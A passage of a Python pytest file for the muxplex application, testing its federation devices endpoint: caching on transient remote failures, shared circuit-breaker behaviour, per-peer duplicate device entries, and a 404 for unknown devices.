    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {"url": "http://spark-2:8088", "key": "k", "name": "spark-2"}
                ],
            }
        )
    )

    call_count = {"n": 0}

    async def mock_get(url, **kwargs):
        call_count["n"] += 1
        if call_count["n"] == 1:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.raise_for_status = lambda: None
            mock_resp.json = lambda: {
                "devices": {
                    "d-cached": {
                        "label": "Cached Deck",
                        "sync_group": "global",
                        "last_heartbeat_at": 5.0,
                    }
                }
            }
            return mock_resp
        raise httpx.ConnectError("refused")

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    first = client.get("/api/federation/devices").json()
    assert first[0]["device_id"] == "d-cached"

    # Break the breaker's URL-keyed memory isolation from the earlier
    # success by ensuring should_attempt still allows this call (only 1
    # failure so far, threshold is 3).
    second = client.get("/api/federation/devices").json()
    assert second[0]["device_id"] == "d-cached", (
        f"Expected cached device list on first transient failure, got: {second}"
    )
    assert "status" not in second[0]

    # Sanity: breaker/cache state is real, not a mock -- reference module.
    assert main_mod._federation_devices_cache.get("0") is not None


def test_federation_devices_reuses_shared_circuit_breaker(
    client, monkeypatch, tmp_path
):
    """GET /api/federation/devices shares _federation_breaker with

    GET /api/federation/sessions (keyed by URL) -- a remote already tripped
    open by a prior /sessions poll is skipped here too (no network call),
    per the docstring's stated design.
    """
    import json

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {"url": "http://dead-host:8088", "key": "k", "name": "dead-host"}
                ],
            }
        )
    )

    # Manually trip the breaker open, as federation_sessions()'s fan-out would.
    for _ in range(3):
        main_mod._federation_breaker.record_failure("http://dead-host:8088")
    assert main_mod._federation_breaker.is_open("http://dead-host:8088")

    def _explode(*args, **kwargs):
        raise AssertionError("should never call out to a breaker-open remote")

    from unittest.mock import MagicMock

    mock_client = MagicMock()
    mock_client.get = _explode
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    data = response.json()
    assert data == [
        {"status": "unreachable", "homeDeviceId": "0", "homeDeviceName": "dead-host"}
    ]


def test_federation_devices_multi_location_composite_key_data_shape(
    client, monkeypatch, tmp_path
):
    """A device re-pointed between servers shows up once PER PEER in this

    endpoint's raw output (§6.2.8's <home>:<id> de-duplication is a
    client-side rendering rule, not a server concern -- this test pins that
    the server does NOT attempt to de-duplicate, so the same device_id from
    two different homeDeviceId peers both appear, giving the client the raw
    material it needs to key `<home_server_device_id>:<client_device_id>`).
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://spark-1:8088",
                        "key": "k1",
                        "name": "spark-1",
                        "device_id": "peer-spark-1",
                    },
                    {
                        "url": "http://alienware:8088",
                        "key": "k2",
                        "name": "alienware",
                        "device_id": "peer-alienware",
                    },
                ],
            }
        )
    )

    async def mock_get(url, **kwargs):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.raise_for_status = lambda: None
        # SAME device_id ("d-moved-deck") registered on BOTH peers -- the
        # mid-move overlap window described in §6.2.8.
        mock_resp.json = lambda: {
            "devices": {
                "d-moved-deck": {
                    "label": "Stream Deck (alienware)",
                    "sync_group": "global",
                    "last_heartbeat_at": 9.0,
                }
            }
        }
        return mock_resp

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

    response = client.get("/api/federation/devices")
    data = response.json()

    matching = [d for d in data if d.get("device_id") == "d-moved-deck"]
    assert len(matching) == 2, (
        f"Expected the same device_id from both peers (server does not "
        f"de-duplicate -- that's the client's job), got: {matching}"
    )
    homes = {d["homeDeviceId"] for d in matching}
    assert homes == {"peer-spark-1", "peer-alienware"}


def test_federation_connect_device_id_not_found(client, monkeypatch, tmp_path):
    """POST /api/federation/{device_id}/connect/{session_name} returns 404 when device_id has no match.

    POSTs to a URL with an unrecognised device_id; the lookup returns None and
    the endpoint must respond with HTTP 404.
    """
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # No remotes configured — any device_id lookup returns None
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.post("/api/federation/nonexistent-device/connect/my-session")
    assert response.status_code == 404, (
        f"Expected 404 for unknown device_id, got {response.status_code}: {response.text}"
    )
